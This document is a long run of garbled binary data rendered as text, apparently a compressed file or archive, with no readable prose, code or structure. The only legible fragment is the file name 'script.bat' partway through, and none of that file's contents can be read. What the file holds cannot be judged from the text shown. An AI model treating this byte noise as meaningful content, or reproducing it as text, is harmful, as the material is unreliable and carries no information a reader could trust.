I BL*taΆȚߤq7Kil
kLOו>'b
8U@dߗe)1bǥʫ]~lMwX/ Ih? @EV?YF*92S
b~}Av>0?`3gcs'Y5G\	gmȸIJUbuPP0ntK@oCW$ٰۊ4HJY]nX7aǽtDəիUD蔸FS <
{`wgc
]'*z<Rr)~1"	*Ŭќ2G¦pqe-"VK
 
pJ(p Gqe+]bG* jLcrFI 6#:?wpJ7v݉Ԍ
rSAXZɊm$"rofxG0+=Fc|:jmyk2ڤeڬWOc.ؚa3N-(wIPܜfM(1)YDfG~iG̼*j "t٢R06A:>hԧ}Z.AiYTI*0Zܜ
$\\@+
#0i2
D$5hEݝ
mŬy><+VS
MdJ@=+4QiwwuҢ$
2Yoh[ߊ8S3k>LBu>78xKx
+ӗϰ96t06QȐMK~ <u}.}
CVUz5v'ۼTK2>&sPjsgoPEWfHybm1=Ayuĵ,{Ox=@c~8šf{MqN*WaFPeC6?oe6?cckk?qeL~_$\\Yq_q^рQ,rvi6V߇>b^;UDAG5u] ah0B5@ 
r֬YRTM[{:_]KW:`L3i
"\3{rağMl{:RŐ])qWړ
J`  O*~5QĤ<HJAdYjqfZ¿.л-$
?f /.f0
p4wtOkav ޾
\QiȨކ?
?m/6 )mSA0Y  a-K6O?e]Ju׸8\t7XM0-xސwG1o-TRgq\*-yWo2v
\:AYvC[̮Ru (lC?5q\i
Y0 0H7wvMQ.*"F8v[@0~k9eTL,lW<쾒] i]ZwNܻqVb@hJb.-" ᳄ـѓ
z+wV.R 09V*߆)[<$Gވ @wi@pqs3(~JZ]NTaʮ#`{	U`\ Q
k"0LAS=:rbt( ص;IAlDe?{tt$-8gtΒOQtb.Prۆښ ȹ2U$eR)&jsȨ-]Hd(OX+91â8qv^nQY SG.ھA89N>1s>g J^VȐHVY
F~Zw*HMBM@	еsT`Ce.4N.I4D1~ˑS-8Z) 9"anMl(5>ڱf8㚷t)ⱮO.v}K:.Zjzr7ȇc_W"	 EE q9nyQgsPŉ]7sF>
-b<[ZKaFVÁfzOMe9wbkܦX9VU:?
鵅}y50Ϙ/P.r{7*ksd/H5n]kxe0
 ?4JQU "RݷL*,.r#f*5@9,1
):C9
Z}߬:5 PE@0߽꛵)`~sњ4R2b5`yR0Jt V1Hքvϐw3`)rbrxÑe+T:_,	idӲmtchY#$r6Ku~Fmeg'TIRRb3j4Xo-AKO\9ai.'AC(`ѹi[>4E}PjUQ.;_lҁP33G!Yv~
I
R׷*D؋
>P_N:J뇝UQ-Ӯ[
9(K-Bɏj
fn>o
Z /m.JuYPACD
Ѕ{oߕ젵G{'qVwwtMA'8JA@$ԲN] GneP J wIc
cx\n
:g1HYU1UYp CJώjK6ێÔ4CաrT4eS
s bs2nQ1i]HNwNW/+ͥKv$_2}sA^^
mi6{ló_
f.p.7!W{zԠz{~V;lPy^3
g<է,>B̶p\S[ sP4$qMײ7{@!JfhQ,Li!YѼ-˪Pjzk8z$N3kAbNe alR'}Sy
89뿇F4y
F.dv$ ~@MI_͕MOKMhGF8)mE2zKU
ZI79) 'HF	h8hN' ~{Z
{OG3~q
ߑ
HGBlS#Y_ E
16Cw8TΪX.m"Ebeȹu=fԿA44V}C_'GZg\T3z*wH}Ǻ5,s\<4LQg,=kk-H5/e/a}dPd"h}6*i2V[w >gCk'	N#b}I\DP5(7N{6\*L7ʰ U#P\#b/E}8 N
V;@x?PDq4C=82eb+#	T8@Nj1AVM 	1̟fB
cmߡ=D>V E>m2ɸ۲cϢh"uz?)lfC*$%hce4?uSh5uD>n{|/vE<ofّUX>\(Δ셈næ'duN/7L=0eFtP	[l7q?E_=/VB/2`=vucy,O,8aUX4NM{+HHp>e>,ܔ[E nFxAGW,9
JnŤA#
ZAE8BnM{E?C
u6I2˩Ya(/iz݌ܬlsz)lujgh;fcL+c8[l	W1?ώK@K;x	uMoM0<
WX1J7N u
_"jʇHDv"RPiLT0W:2Ijj ԮO<ʵN Xʅ;? D^Qjz殾6o]~0Q	,e>
0>zѱZ DL
hQA6)=Ao?uQIenJ$xmg֔p[Q }F:
wUl+P
Xglt.Xw=hyFՂ<--{HR=ȰOsZEA)
έ
nVi(tBפӺ=V]E+}3q}Wg-sD-F'ܩ@gnÜ"@<SXRyyQOD8L6\b"Xg`>Ռqq7?ov˟<}Brg/'ФJzwZf)gY<ȵ$(rSdqi
k
{
Z{Q<
ҒB mg;kUh`K_0n
 8ϴSz
#S+ʲCs 
DA9m"i.ˏEdH:&zV\j=ms'b~ƋiyJ]&AJg
w 0z\N)RwC(U1.m	?36ȯ0d+"t9-y Rtf"ls>d`8nI5OFYF-ŧbcH`ԕ)
lFfB Xe4?*
7}Qqh f
8e-vMkiIOi-$ 9	V
R7h}Gw3]r3LQg_}lT
K78IQ7c3IeHE
8+dEEAU7۠aJU5#
oV~Lk+>̦q/itCЏ3Gf֟FmNb-
VJ #)I58Z~SSu~lK>Q-i*sHj5'JMCrמP툶᱄9ۂR<*ĭ3}L:/Ҿ#L4Fړjvݐ*4CdB1 e1W/WQ응nVF}k؋/u
ѭNo΀4lН?E+ 
kչ#7(n쉃h GiZtBH
4UI{C勡Pl駁o4Ɓ"bT?dM4*Ma
U ЇT[Uv*0d	l_?6@
6ƯO`JgA+_1:zŧ
k74VO`N
tZ5g#}DA`?bwI$s9?JDd+#Ze"JDؖ @<8.혠} W6` 7P5]hHV:UB^ْ^0"A
s}(C¨ٓ}ʩڻoD~	i-E4>B
\r-QND9e  zSBF"M>CDF?Jr,T GZnh	\>E5+#8
V=_x$2j
P3: :S#9sVAD~*BҫZ0<aOJI-q"IAg=hcw/\_	׫(Y駁bYb5TLc;1c6<D\S	K_zhsb%},nB+tBi?fqCr2%kO,%]۞J6gܢ
 Dt]Kr>fFJ	GmGug
`Hb3- r]6
*@K3][FSabx6L-r1ة
/0IqQ]V
 RKSXxǆ'lɹ'kVv̘df8\jrI9
z x? j\MNFQne:yF6s{Ce##_(Do4삆XY
h++˕}ȋs> LE)#m/:re"*?vGPxfL션'}cLrs-Y|Wrbh
w~*z뛝(Hyؗt2Y#K6~uMrunuJc~}s>e}Fj˪ ̩bR~~
GaC+i2}q01s
ɾtj /<lJl(ku='=yN]SDzS
]uVM)o8Ahnn)Ɗfqɰ*e g=梄r`uP:6'Y©##22	k"yQ@JH"To)l]<E>zE4B3'Ǘ{bm_/N]I)_Su:*it]5x'PXw 2iےZg	R1ɩ[ z(/׻
? u)ajro6@+<ytd-_G
<+ y_韢@WߐeH/<Λc#\J }+v49F۽.=xha# D5V*q<y:Vʁڢe
ѴX#۸E=np7-AwGIqj+"#Ժs_6]S+or[P&kˢNi.ґA
4
=zW$n}AY6dozWiUW sEl3'kUUc8->=Ysgkj W0U
*j=l3oF 	޴Uw8	 rek/x2frƃdsZ?KBw$mPy"
r\ݙ
7֨i?0~':
#J9*G ؁qGĨvTڟ@Ei[ rmv	'Fnrv
IMO=?vg~P]2 o$x Q$6y@bѝEȶ~]<<	5ZiP
`K IL̕/H"5й
pYI½9qS5q ӕ.z䴏8Je
6Yᡊ4gl.NWM
{y0Tip2Aϣ+S[wC[=Z@v=zD7dq>p[Tg]nnMz* F
VѨtfi攞]eD>_Mw̙5\t52U>XDI'4g0 9]G۸eMxWXGCvd
j֬\t=G{d@la"ղ~F,6.iFMނlv6yb bcq@0STPyOXؘG]
Kcr\ˢXUv όפD\@ a
rj9׽s_(Tp""\S)uT
}DK7@ʙqnY͕3zH џ9FLi?i[e>w)nVtH_lT)zB#_kȊs6zo`RhLZfS@WSyތ$J١hˈ=f"
Mu51Ew"v]gu&+	qz0c͜|nVk[jfآ#en G9Jr>}gpJr0S;(LSՋ3ǁתw!vʀ1pjƻRT8U,
 OŊ@rq2JwEP
QXD7\s5Dj
OPNpn:NE
keh(l2
] ޭ5W0Ki@})
I.i  S9-*"T
G@ cݭ@ƬnSEI0*8%s?%i}C"qAYxBJ_6fo:?.T
8H<ZL$̂j Bj{joOjgxZH2Ttƺh-F*VF3P uAO48
W$TzHZ/:`DtBm t]]rd9
3=dKϲz*@W~c~#L5RTD-qZmN*O}nwrq)]vyY}>r:\)l
1hŁsqvh
ێ{]6ȼ)Iao $I.
jGPLIRX0Bӫ]qh_q[c+C.~_?[1
S<
MApJ +J7gXĮr .rБ~(dDF.(8VŞXV6TjKPxDkUx2ōy3cC$Ζ">+<@B{׼7vG
i7q*3cMO{Qwi^\ڕc
s6sQpA7\PN䆄kwxJ+/v GWHȬo֘A}
 ";vOGB	e#E[m)HHAm#)S/jٗuU8tbK#rT;
]qT1Ȼ M_2f`ސ	KUL ُq!UɌF^
`x3lE={Io of#SҊH͓a8kzp{"߶
AȠ}n)bRcL0 i	y"P	 ~!`V)&<skvˮf`&Nw[a^:"Ef
_ONr_Tks ʁey^ߥ,\
g+ݢP?7[r6Aqqs Zbhd$D
p>`:-z(Ysq
RP@ ZcpҦvAf0
jsJazps
D
vV߉Wwwf>1dU1yA8DC:g)8;x	ҹE9ALEZw
kHS+?CU*oH'sg39e";g]';ZP&)6n:5	>&FbNɿX2@`{&ch@[FnZliWˮ' Xe\ՎhZ Gb˘bL5|-8̻ן	?F
1zigc c'16ڍ2}gmJH
HSW}K]}T?`y"iLT-_bvX|Zfԅ֗1P2Rs]`B
?	AAj_#?Y.Z@w5{И]Ht9x4Ma+}w
OBHMٓ{d 1
TP7RC)FNW5u.+MphZٙ*̊ 3/iH~<3VsK
uzk
_Zv6:Ms +dþۃ	^i<-wg-9~5k3dF͈K8Jyz_Yf`Vu+N5>
/Btr7-I庿b+jp	B`KV	M5<Ӥ~
[M	)ySi{
O7Ne#	G<ze2 H0 JfbSCzv8Et4
LԽx*D2<BV#OP8m5!VI0R3z6wy[H]Z[~Y
3ܛ~
DJ0{`	Y`ZzxlUoIFeu63k+5F.g gJ+ȯ:M/N678e
#(*G͸AtQ[l'\޽Iԝ-ާI<
oH>٣
/wGxU\D(<gK*lIN2`̅iEѩuo4BPYK8~QQ	O䌣i(ڜ(; x*0
109H0#
<I<Y G.}
 m0H䩍t
]׈{=܆wݗ$Tx c=k@~'bՙANF@֖83:#J)7
G#-iˀYh
wxz
(1n9m>_Qm/l
 A+nIwYw_]1EseŌ=N8r#ߦ:jxh
fHgF1q~[f>ʔqĂowivDO-R
`{poab4B<K
PGخׯzըms S~2:9Տ+/?g"B@q$o~н*:SgTTj"RE
9'AoZoGK!)3ITСkL)RlAiFjLQpon]g>.-p7ܪ*H+z2Xh^
kqXsSj`Bx Eٕ
:#y1c~s6YHgQ*_viJQ_
h:߮8wf}
:`y>j'*Ǽʭ/[O]#Ԗ)
oi
XHnh8ZZj0TK:x\W$#{b#_c_dlS3XBw$>*3U=OОil1}b
@RCXZp\	zb8Md#[HtЭy
u-H)}\9ş
zeܤY
(O-<
r2t1$ Dh18\_-HOB>H
ۭcD@
)8G{p9o KÚ׎ŕ'd
	1v{q>y뙥vK]Z*l?曄èA,N:I8:QCBP%ǃ
$ol҈$:
ur
ptv/yi`ᆞO
Ӭ]OO naPe<Yʫ9JTmz.eLCʚ %ѯh#iS	uwtqGj uno7RJ@~cuט>ICNu(\i?x9	+%K77Ln
\*
4آFV.P4qKb>7FD.zqxܡ梵j)t Y*KEy?05SA1A[a$$
u+=B~-}bɵKT4iw5uzz[a5hV=B@.g狳gь[w۩gkEa"|S~=@>
@D)ji߸#Rh
L#3B=ucY
J}_-c]rf/?p#oxqp-tV
AB/Q<:xxI}30z쩄@}cS-iDW
>R֧9r:ٺhWy.KA"nNGUI`PlM@"jAO>(9ZSob7p#_}Bj~c<1F ~o_ƗJHYZs/T7G>2#c)*H
bjoH0?
dtK{S Q D5H'm/pXX#kk3٥
*Edt?H"B'|tb
e=?YZ tF?MFv?sӶSOm)H3:maNTyAٞ94lHguoW%Be'ЀC<ey25:qijecӷتDlp,*s~?0h1
'A+m:s9j6B )TUݨc6ݎ (F=u4rp0}0flK\,?>]8*\D %Zn ;X_bKjXWpV>YXIަ[JY{K]U꽈H7;%/.WM/?)<\ȝuQ-9ri䳔
I_=vFi߫_xhdC$48tV
b`1Pw\wJܴ HeYDZYXrfJHjojy{(UycDt^m5gw	ROCx2;f pno>Lt3Ʋ8Ƹ)<$g5x`7K<㣂
wwn	g9}~쫴9PImwWKkI<H.1gh1l`jXVol.)WJίpU)3Q87!\.U,!\4qVL
QwoSGrwv)/eXHf
A.SBGv# 2L@gt"4O6_.'33?wARlQj)pEC`{șx&At>7LrnG88ezǯg|RTwV=EPB'?l*J87yB.':Xp<YNkTnDG9Je:BG׫)i")j_ceA ?m:R/kaG<(͎1Q;SdZk錛崕_>ZQHBJ>'_;>T^o]RL-w
`׸ܫ钶Cy}WQwr{]Jf8sYssĖo
#I433j<h+ʪ ?[crȺE=5SKX۝'wI@EvlIݜZTލ˔o{WGZlWe è
 
өsG
﷊\+tH)0Sh}D zF{][1ƴBNV+{=C
OYnsA
"ژwW~bt<eD+՞?69m|o= }
ҭْ*:ϮiORfgܟi+:S۴ٴQ
CX791rM䎂'Z
J ~8(tCg=ŇMbnxިp
J_.Fz𙘗 mE*
̍G/ {=.8Xc'jʒU@`ΜP\<
r:Ԩ>JҠ)S<Æ7B8T
Yսza$R9ZNU[K q{Ƴlk xp1RP$=.ҋ-UZS=N`
4>:U~IQ2Spŭ_07>xgX~Q<Zӆd4(s@	TO:b:b8i6YoiSiOTִJ
9se0ahͼM<'j-I.
b8b/@xi
SĤ<AVװu {Sp5~{4X qmΏ
5oVpV8PQ Ik<Wtw{*)c: ed'}$T4	˒Jk	d8b3/fբLf v6בA<Izb''h8#8b<mXg;Z{ёSR~prZk4o`
 j/wfj9
@>OUqߵgq
V<.q
-ifS ~"|hة;EF !4cF\6qn3"bíߘSK҆F"P\+41b(նd$ob|mjxJdp:.+$6al !VӞQ"iH7#B)5wwXlVߒ
)rto IT~
ZT9
=T?)Pg\	;=r)qwvJ%#c,
{8b>/"1ƥMk:گrl[gٻ4%\'&yp3Ra*=]b/v)\ޕy7w<$o*ɉA7eBߥ87{yaEɖ'RҨNXkU\%-/RXQs~#PUT*
1VʹdNnzRo\>˚	w+6Lr
Y8T}}Ȗg=:XrwNP<'AJ
8t2f]ʹ԰ZP_O>Q-
l:o Ԫ*WyrcHa:	N+
OG1sJ[h6BiBی) "W@W$<0k7:wna6]b8$N 5VyyQr3D+ţ~;k$m=J_ h~ԍS1M[*P(o0m,&:	7$e++򢹳5^"sʳ˷xlthy{cf-mRW1xm]U_9T<\d_Fͥt
4C8E@ꍳ]buVw*/fr_ƁBQ 7$OQs+Hwoy<XYu?IeMA`{Գ0R;Q]O.!〆eq8/+Ϫ# dgWbvT{plt8M6Ől{Un#!ClMAnf
s-c@jK֠t_"3G-ly 9yĒC7 {!q\QPLS)_'k?MmϏQP̿uѐ@=00;Yd
 n>@}5dg-qcǑfz=
~\YEeF\.Eîof5cQC޳M
_(F.w?r Q	KVF'$t1eHJ
uߎl2'?oR9?
aKs[1Eۍ1V.XkF_/H*w_zrԜ9Q5x-'lJ#zW2il' wyexlIV65_*9Og\6=\129ԪhDx R*\\7swo8*rPZ-ˮ#<O
)o[8U:MfO'd>.z5hlƩwP_r
F]~ɷ}`aXz=ŃZZȤĐXt o軕=KpNUlKHմXzRrpl
I
K_@XZ]C<x:VDibF=@L aت//.Ϛ+c[cUmd>zpk*6z5Oi
i
(<̗s`NKK$zo9 8higĦv_UfE"Ox8d1 ] eCg)uv98JYo/&b`:asټ7ŏ+ŷ0l
f4 ES
J-\uJF꺆S@ 	: DY"cJ KnVW.>Imv?Ge穝4(&HQ7.hycTs5Cw*.OM"`*ۭidypeUlt$oD*et$t6
w{s*F4zkqvҩ}~i@o܇N>M/zj8+A%4,Z\}4\QiOvi/x񆬖2xH9e6s""SZZ
ayצ1r3#gݲYe+ޡDP Y';gؕ	oľJXO,IMd
:BqgY:
HUi5qPvlb6ǒPV 5j'WSק]ƔxiՠT'BN\R$	ZJr}ܼFhqK(l-$LOSG~Ady	`%gWegQ0c4貸?%Й764K$e1@B;b(IP=~6iqA{1JĂnH@7 /p[DrUv#^^׈wK/ָIQmZ %v}SM`lH{k'g{=p@mZ%`g.A?lM'j0ʛP	k}oJ6䀻m7eQ)K>	SOBHg*sԳm:޷m)TJ w2)[
3_j#'LA
Ǎ\9#d\׺ީ <4m'etEnmDAO
{SaO{S5$57JO#9G=N0H l£* Tt"a1J:4J0'=saD0J#oj|toi=[n' I?->GWCr4sT/O12zNo5=Ni >6N12
Mm_t蚡`_v/ WҮܻ2Lo8)kߙNE.~)Ql6:>ȫk0[Qre.qZ\n+8s\JZ
u7yh-ɬ7DwWa .GZ}Jx
nf#Opu4npN:4	[vX";6##_rƞ?hՍOAz"lQH<"Duh1D{ŬVK+8*஠flvXnqHtY*f3N=0OZ,r5/
уD6~gCCOJ  kU ̣ʭ1^"}?ϯT	o5p'?tF3fF/NP
?4o
4W p@CQϲ5V(5P׫*J]"4YᛶH:MUИgwa5wz?wòmyP *H'zdn(h2 1{Z+HA@F,k3r7'-
0AVb0U ԀAWx6rӐa56i
ڟ֙[sBL Q:J1C߹e Ez/Xϭk3n
>7kQ+tqRIM0ňuPO\9bTWϡ3Rz`ފ ~#֔r'_
6R(xʱT/EFTI{
TV53u u9QV>KYsư*dK'o"O<-|
*noBRw l b90
MZڑvYfbzpff=y"9i7s;<rJۮ,+Ekk`(?d>nc>[yMPt?]mȳ;)?v z[ˁqcN	ir**
+ H61G5ZSa=
kwr*W
$(]5
d q ޶
lgS )(l@z
r$̏Ѹ\
0Q
Ҽ
]SqW>:F(jAp폂MC2Epxf(5iD4x8LSvJ
??t1#9	OKv<Z#cK:j͑kC5TM] JSUS'GB*c]hVª-W`7M1E+9ϓm~.oR4zޅEgld윖JIG9Q~r*2K.`}]_h"YQ=ke1Eq&CZw.ksL.wR.oxdxOC:
m
9
w/6Q xKUͿ憽[Q-rGk6-hCl\R:f\g~F(_\$:20t2Bl jt.c
"}k;EU~|.(jUl#UL=)
<A@Ґ@V(5o:ywE-.xw*.
sR<-ւ24GuXReF}U4r+ğ4-L01Ga-yCǒ$2(x LB <3*o~4]2<@ܘIIjMN"$ -׹S00
I6Vt7N0Csm /4 wi\"[FoB\pęΙccD?
vN
}qrz*'/1N.lcCQ]+lnoкUhY"HP[-p_
b#?lM]M"  #9+0tM	fվz?ĢO
Dͬ*$<Dq. xmvdyMWI Aj8Gm$?KOys#ɼ$wY
Ap㢚mCf
N@s
LQ݁:?{B7(#EPBPyLܒG".hi
lwYj
7W\"x,$꩎ԋCB[:Yz#u  t\otlhm_	GͫnǱJMb4#1Bˡ{cΚ˘[,VG
2o}i@*S*.dX˱A뾷/	`5]:opQ
WHerUV\	gȉ7oM'o*K1	< rԵ+f8=BۺO
[uge?w/Ep
:TTZ̹mШpC 7cZ-O>diY郼X<rDlK?DlPh-}yǛN\{\*:Ou>ǤllXE˵Mb8P;ʔ=OL/(ӊZ9}"Ʒ8(*Ylv"EIS]Y[/+Jkf5:j{M<QhJ\ﾥX"s*8-C
sBlyGkSQ蜌m.xTw¦(?[/q#\)6UWkO̺<NŪJ[Hdtګ
P1\}{ʌh
Oڽ1l ౷s3	GP j<xDN(8Ӌ+WQ_@6qZT.CKqm̛vmubiBh~*kM$:ґR?a;r1Lj~N<
t ?
zY O4UP
K
tnt?:q3^
*rPt)[f ׭dQ4*VSyxw<zgaK2TKNWRhF"oK/},})de5eUe CkH(S"xj~*BPv\+VNx
P)u?Y#Zdk#}rtcALm3rC1k\w?V
tݪ{5*kA
hRxsX  z0xu{$2T'QLkSϧi0l6vUs
D`D?YSfieQEBe\Rl.K͍ /37BeY rSbmlƏI?[srfr.nlז}]VϺv
-
? Z)~ŊCH>p/JlA ĶG7f2`'L8rQY/̳r1l\8'Je
sq7]['3FqSh)K2\M1ڡlZ4Be
>yﶒofhʠ»Cr✿Q>l$>a$֣t-}6Hลdєxaz
䄾U?B2>/Wqj
0mQc12}SDHIؖkK42y@< *+1بv#QInȱD*[pNr8#\4 $adzP=?7PF
d/ \]L7\ockv~e*`SBU<EITkQw鼝	Uv4btc~ݨg7=
T6p\
 qVFZ
w@SSaJ cX# reoMx	3qwӡo	Vn4dO
`Rc~g`q솇NwTKlUTbz3JW-2h8_VYrz M2:?gU˹Ϻ/FoŎ㢋nmR.]5}I N#Ne_fD#a.	ϛ6̢'HfhFvSia>bB=⠾J GIIq3q2 4
Bn[6nS i1v{DP)Q<avgvn Oοh
]n}s6u	@8Ms{L*twvc<SNڜxƢҠswA(ǬWP/l9xҠ80C2'k"\,u6[Vb=-<D
8GN}A夨Wv:Gy90zm	ճ/]RNhRQgqhbXSU8<7ɒ(R.`,$,2C\FcrT%S?/ga3
ݯ6m(n'@oeɁInh('
IEŲ[_ဎVi
ꆝd7lX>
C3<-V ]t՚
ya  V)k:"]egcCs/lge
B2P=puy=l8*ob s n-Vnw-HDyqfŤ7Jܠ  ;]n)zސ 1X25ڷ},DcTǴ^[۸VƮS/i\ǹ#+;5[fz3P Jtn^Ox2
\
2F9\x9wE
 ZnR4z'[jVmv٣jُN
(iNxTYq'Kgn
֊9w>2߸gx΀2.dƊ
rp/St~ى erKcSwvJ)mD}z0ߩ
MΎ}J=lYl4eEa60g/k/pEP ;W,jeo.) SnI4ɚȀwX'b`5@;gzL+<_#	ojLT´ 0?7Qwm{_ȔOꭼ^bmV$􄙑/ O?ǃS:CI#?sA^>ۛS
e#Efxt聄T	?2T*:JwpfrQ(I1sow_oR:qYB4XΖuY:+uYJ1t[nJ4˄~*)+PȚdAhd\ {n
mtوWyn@p+>c6Sd)y`*WK#WRA
2gz	l{0.d -D˥Ex臭"wmiPoю[laSpi]*w
pud27TؗbZ_H3ލU
8 [x
atA(M凹M"}"ѱJ7T̲ 'yp=n]C7(ǉ?$]Iࡏ(15S^D±WMfBu]Pвvu2j
$ l~*Tp\\Id?+
? N
ۆV+
LH<ek-m×ic3whe}<25{6[}gx	=WM}
_
XMRg0Î7
l)Y+
:f
2։$9p`źB/S.'joȶhR1f0\_S	GV
{O K4حI}̨r 7
8fNaޅ=DJeE]ߨ{
UJ4kl[E"E="?Jwi	{d3O44G<L $/h(xf=b޼TD]D#eZrzй8G-5CSb}UM5	9d=W2u`ڳ߻>(ϫ7apCgd14J) 4ƉIK[/
Q/xWA
*1
/֕1ӬzMa]ٴ?D6]74sR*}*lz
`9(NZ47
ʜR3( "<l(}
j$
On٤	+UћYG8MW <C+g}ւ,UQPs3*ciG$]Z
53UJScHQkӶ_e{*2bGtKb
q:?}
)ժclu+= script.bat0(-K7gEueQ.u f䊁ϛ 
j
6Rഖ:<A}R'Kù0)	U@.7MU=4ArWMSsl,
2 OSON2lgEevM~Ftl=A	"uǻhƑ<>[>2K
Ą+y0j<).ʬb
:C<ė毙/GdѦfZ<dl"Vml*Ǐd8C-<3T2jϤIZ<N
nS(JKK <1aD'9 Ҩsu7_xǴVd9*LIu
[qTWT$Aja6-04Ie6
nu 4>ؖSPO$?ǰ_in">HJW	y
؜c
b/c"å'x0ˈNU>o U>* >@	. T$3:8E*Gi~@eS$Tg:Y7
Ϋ$mۓ2?@堜f#v:n16 `XP/h4y}#T񘴻XʍHsF
Oß[q?3j=heJc]EyXxJݑafdm#O~=DZJY*(y";iOĘd{}XPky')v8cy3u"*1J`J97ovic9R~dTзm
 Caq?'Ne Y4mB 	JP*wP(	8IyOb9wY:R6	ML2F]:aOt	R#gezl5[<8.:dO*T.np`OxZlR
fv{ʿ(7eі0yrlXz}׿udvmfTy\,BMYT
 D¸X "ɢKܡ%dٿl 3[sȳy_Jkn
M=ꖠ7ғu?1:U-0UKOrlZ6lfB\M#gaTZ[iݷkpDBmRՊIߍG݊W+[=^4B
n52osԜυ@t`f
Z *@MX(mFnGE~Pv
3GXeF(#뵬y7O2ʑ{mRp TR0_y
U
M]	F-$/8vE$gb>:H
iB	t/(厝4FEOĚ{vZNVdy'm@p O~cfWsps
zeUhlTyUEi3NW/Ǽ yXC
'w Iط69OKzu>Brke焍./buɱLGk?l3?WZ QE097[MMzV<Æ"rtS
$Ǣih?{XtʜVun<Β1
cvQ@tM7ZT 馢hyJwz<d#f)b/¾t0#HVXM-/ F.v/7(W{+ydUѨx{?5\= R?Q#7drNhG0~<Hg0^<Pu>${HA""[!Rޞ}1pa rPOd5,FerCkMdKmj'LWgd2X/uvI1ub]iԞMB:]0'5^)i
Juve7ia]T`B2 e5Cm8Eѥ
E{}b}J}B=oϗ
cqk1vG ѩ?:ivQlI+nM(0}[\*E11Ͷ>مI0A/
ʥ u\eR  *\*OrWEVy~
7z`K
bHk"zms=٪:Z\6ٗLc#$
h<CNk]2F9>-{*\{'P@
HĎL{U
EKmBbxB7YtG{NkTXAXs~ n\wCc1"*O{4|ta¤`Bo_~Yfx8F?Bo)tBf6M<kvBY;[#&
h
6qFFR#s~EƘ
ejqexZ2"};KY&$80 qaX(,ga	ØN(+Odq" _gX	Hy0fx}rIS/s
A˺trFyE0l-5zP5qjѠ2C/}hLN=Uey>U~fQ/"
b͚'ޜ:@2\>srnJKܜǓh`r77hfIk\hKP89o ƈqJ7漈<]-ih
5tBi m~NVp)[F{5:`	Eժfk=cec)_Qd1YXM j[j\l:nM Bh/ 4Q_Y\eMݯ\d)':@
ayY"?p2gad>Uo>T-3NaU4\)Rpsb:Qb(θqjv\6Cʄv;ҝG]_YB#"ۇ-xxCv*xbKmF
\ɔxOwp~Au
T8@,"&NC韓8GQ*/'gWD[BUs4vw!Mb \$l@g4t(QJ8B}5pnKk3cTv!\GDtg
oUteAz<
k

0 +?V,X{woVz's cj-#$E:ti0ōUC1JsЯ:=Z[?
ebQGbjjq'-d
BPH*TtيR
1gWDS0nGT
ΔDywDs4sWmZ>wr#CjJNiidkho~LR*
Ʊz
h$@VNG:J.jw#>'o9F1uKmٿ-UWi떅5SEUERԶ
}FK\{ELѼMPlN	ʧA>r`z5\D
b_'f`GrIo؄]P\>)o'l#bh :R
GCZ67q
Ӄ+jFtRg
ГߌvXkp$N۾ƕ)m(@lV<fC[ywҝ2mzSw.?TJϣ
YRS>HjeӇٕj4pXڹ
9(\XE~t)tC9/h1Kb's27L6eҝ="Rptu17(kC	dAI~WAwRx-sŦZiN(l#70woQCV#Au-*s	Y69ͨCoS+')FJHJ@v l]D]E?
4uzJ
MlIWtkkXYR[E+ۣYR};X}fwXCG=p
vtrhI*iB
q0J\(P>~+c]vY"pkywqϗ,9-G:&eg?κVU;{wyMvJVC\Ҳչ)//I U TqxFvT@#øzR
X	IDf\r]@ R[{xשPV8+k[2
_nSYa
]Ui.~26æyYOa)Ӝ[[ ZB.Y$t
f\bka`>9ň6y(`+d?H"e9>U)lNb`kyJ{tVLXз]mڛT<w_ :l/RQj2L"fOϣd<w 3lE.ٽ?
s
s7]wk:2?cE(QӃZq~qlv dYKljy__Y#ԉLKSB«Dc ތ
l-Ttvq4s)-ol
lOMbV:X
*ޟƒ8^Yrh;]5ň9r/WCޛiSfБ;uWBʞ:0z
Hp/VWxK2bUEK:  e
6rma1gN#3
<y/CeپIaJb?5պ'}@
j=\2S@X8hjxQ]0FEoi[)U~Q#xw`Ru̻mg

ك-[~]Wh1}B"4V5:/HSTUumup1QA6зYOp	/N622/fPU8I@qʥJYr_` A"\ Bhf]]Cø?4iQcB'Rkҳ1.2՟_`Xq Dd{rF8I([?2g?O$ۗE6	Jϑ}6oNs#
[\̋ӶQڟ8 
Bݘe-ax9-nMd\yT tQ2=B~:/'
pvU4ox<j0E.fJTswn>.%F7物̹Y+W.<M>t-BeSut64).D>h@MtE
uQ1qʑTxP6QmջL'22 Yi߻D`l߁~ъ̸pˀĆ1,
7Z_7YEg:yAQI
)`qpeQym$uTk63谥1oN?w̿~@
`]7rCn
)eTQ4=11"	}w̕TU:Ohz*~io쿼صvDΰii7B*SF	k`)KZGxxbJ
h
ѣ?jF1w:
d:ﮍQpO$6?H
 Y΄Z/+=\ɍ ~1 *$7x$s3WoG N@DXJ8Q
؋ aWE7	{Ux.w
ma
JrXNHKq]ں*_Wi9cR9mXiC9miSri9L߻Ղ͞uFN 2JDS\ҁujue*If3dĮq
F~QK<L5E2uآNMǹNԋ鞔7nbFK	PjE+K=r <ůǵ޵MfL ~z'21-T$x."_,UaG|FAO<Tݹwh?i-
M}	KYyabUuZ	4P~:
p.\zUlMh.k\r4pQXOKACFTBDjLa01=({
B FB
]1<9<)AbO1	Q.ze8R2
qv/wBXnr:56C~ήgK`X$HZߙrOcQyW8t'n>ZjbSxWn]Dºq
8M~G3m午)
:I[ fVC
p(KLI̴}:Stz[Vl"yUBH?qߥ]PE	 zwR =E\cHvn5I>8/P0%e.ցj&XI{6E=Kϵ17HMDiӗ,N(礠?j e&&c*FEPB,]<Pf?~ZVce_7J$իO?=OxbH|0VtTwX$	W>"7KV)>p
j䰹1{ܶO곃~
Q͟~ z5+uqy5b٪oM9I7 "PcۂEkx~B{RU`Ofn =.	}I~xtr
vI{)@wkB<ClFFO N}.
݅p6ACy Ч w\ȯ	EL*={Ɯ[6#oNx W)}n01 J4:wPRUc)
E.S9T@EGz(it R/zn?rhl.tjE`*l{U>؈n1}z$]*}Y
0(N+lϥ<5\YcRT7$",$mh`(
Ǳ)u8ؗ'Y}Y]n "H½3\WG9q_2`>aBGq@=2 xU
km+c$F_\ 2eۂ\x qD 	m"2xkRDEb3dI;kR7Z.G
`#*eKHuoSJƲ?X0{q(+7~ kIX\ҙ=7Gy{%-`3r ;\Xރ6YUЃ7y
ߋ41IVvt(E6tL@PZUꈏR=ڭ*=1.L7JbES@r=guo
2wKӒAK´XM ǂ@yor:
$?\r\Com"3CBQO3y>ѤOG'ӹMeɏCn@ZE~:|KB;=ausoiBq@{"K: k+-Gb8bTG]#X
<]yȍw-)dyi~.30p Pd0MT
t^<d_9=
g]ǧL"
